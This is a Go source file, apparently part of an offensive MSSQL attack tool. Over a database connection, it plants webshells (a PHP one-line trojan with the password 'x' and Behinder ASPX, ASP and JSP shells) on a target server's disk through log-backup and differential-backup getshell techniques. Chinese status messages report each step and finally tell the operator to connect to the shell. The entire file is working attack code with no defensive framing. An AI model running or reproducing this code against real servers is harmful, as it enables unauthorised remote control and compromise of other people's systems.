package pac

import (
	"database/sql"
	"fmt"
	"os"
	"time"
)

func Choice_two(webshell []byte, conn *sql.DB, num string) {
	fmt.Println(string(webshell))
	if num == "1" {
		Webshell_logbak(conn, path, string(webshell))
	} else if num == "2" {
		Webshell_difshell(conn, path, string(webshell))
	}
}

func Choice(num string, conn *sql.DB, e string) {
	if e == "php" {
		webshell, err := os.ReadFile("shell\\shell.php")
		if err != nil {
			Err(err)
		}
		Info("php一句话木马，密钥'x'")
		Choice_two(webshell, conn, num)
	} else if e == "aspx" {
		webshell, err := os.ReadFile("shell\\shell.aspx")
		if err != nil {
			Err(err)
		}
		Info("冰蝎aspx版本webshell")
		Choice_two(webshell, conn, num)
	} else if e == "asp" {
		webshell, err := os.ReadFile("shell\\shell.asp")
		if err != nil {
			Err(err)
		}
		Info("冰蝎asp版本webshell")
		Choice_two(webshell, conn, num)
	} else if e == "jsp" {
		webshell, err := os.ReadFile("shell\\shell.jsp")
		if err != nil {
			Err(err)
		}
		Info("冰蝎jsp版本webshell")
		Choice_two(webshell, conn, num)
	} else {
		Info("未选择webshell脚本")
	}
}

// 日志备份getshell
func Webshell_logbak(conn *sql.DB, path string, webshell string) {
	database := RandStr(6)
	MssqlCMD(fmt.Sprintf("create database %s", database), conn)
	time.Sleep(time.Duration(2) * time.Second)
	Success("创建数据库成功！")

	MssqlCMD(fmt.Sprintf("backup database %s to disk = 'C://1.bak';", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("备份数据库成功！")

	MssqlCMD(fmt.Sprintf("alter database %s set RECOVERY FULL;", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("修改数据库恢复模式为完整模式！")

	MssqlCMD(fmt.Sprintf("create table %s.dbo.test7913(a image);", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("创建表成功！")

	MssqlCMD(fmt.Sprintf("backup log %s to disk = 'c://xxx.bak' with init;", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("备份操作日志成功！")

	MssqlCMD(fmt.Sprintf("insert into %s.dbo.test7913(a) values (%s);", database, webshell), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("插入webshell成功")

	MssqlCMD(fmt.Sprintf("backup log %s to disk = '%s';", database, path), conn)
	Success("Webshell写入成功，请尝试连接！")
}

// 差异备份getshell
func Webshell_difshell(conn *sql.DB, path string, webshell string) {
	database := RandStr(6)
	MssqlCMD(fmt.Sprintf("create database %s", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("创建数据库成功！")

	MssqlCMD(fmt.Sprintf("backup database %s to disk = 'C://1.bak';", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("备份数据库成功！")

	MssqlCMD(fmt.Sprintf("create table %s.[dbo].[test7913] ([cmd] [image]);", database), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("创建表成功")

	MssqlCMD(fmt.Sprintf("insert into %s.dbo.test7913(cmd) values(%s);", database, webshell), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("插入Webshell成功")

	MssqlCMD(fmt.Sprintf("backup database %s to disk='%s' WITH DIFFERENTIAL,FORMAT;", database, path), conn)
	time.Sleep(time.Duration(1) * time.Second)
	Success("Webshell写入成功，请尝试连接！")
}
